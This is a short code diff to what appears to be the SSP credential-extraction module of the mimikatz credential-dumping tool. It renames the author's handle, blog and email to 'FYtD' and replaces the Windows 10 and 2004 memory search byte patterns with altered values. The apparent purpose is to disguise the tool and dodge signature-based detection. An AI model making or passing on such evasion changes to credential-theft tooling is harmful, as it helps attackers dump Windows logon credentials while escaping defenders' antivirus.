@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_ssp.h"
@@ -13,13 +13,15 @@ KULL_M_PATCH_GENERIC SspReferences[] = {
 #elif defined(_M_X64)
 BYTE PTRN_WIN5_SspCredentialList[]	= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
 BYTE PTRN_WIN6_SspCredentialList[]	= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
-BYTE PTRN_WIN10_SspCredentialList[]	= {0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
-BYTE PTRN_W2004_SspCredentialList[]	= {0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0xff, 0x15};
+//BYTE PTRN_WIN10_SspCredentialList[]	= {0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
+BYTE PTRN_WIN10_SspCredentialList[7] = { 0x37, 0x74, 0xac, 0xc9, 0xff, 0x10, 0x6 };
+//BYTE PTRN_W2004_SspCredentialList[]	= {0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0xff, 0x15};
+BYTE PTRN_W2004_SspCredentialList[9] = { 0xdd, 0x37, 0x74, 0xac, 0xc9, 0xff, 0xa7, 0xec, 0x22 };
 KULL_M_PATCH_GENERIC SspReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_SspCredentialList),	PTRN_WIN5_SspCredentialList},	{0, NULL}, {16}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_SspCredentialList),	PTRN_WIN6_SspCredentialList},	{0, NULL}, {20}},
 	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {14}},
-	{KULL_M_WIN_BUILD_10_2004,		{sizeof(PTRN_W2004_SspCredentialList),	PTRN_W2004_SspCredentialList},	{0, NULL}, {20}},
+	{KULL_M_WIN_BUILD_10_2004,		{sizeof(PTRN_W2004_SspCredentialList)-1,	&(PTRN_W2004_SspCredentialList[1])},	{0, NULL}, {20}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WALL_SspCredentialList[]	= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
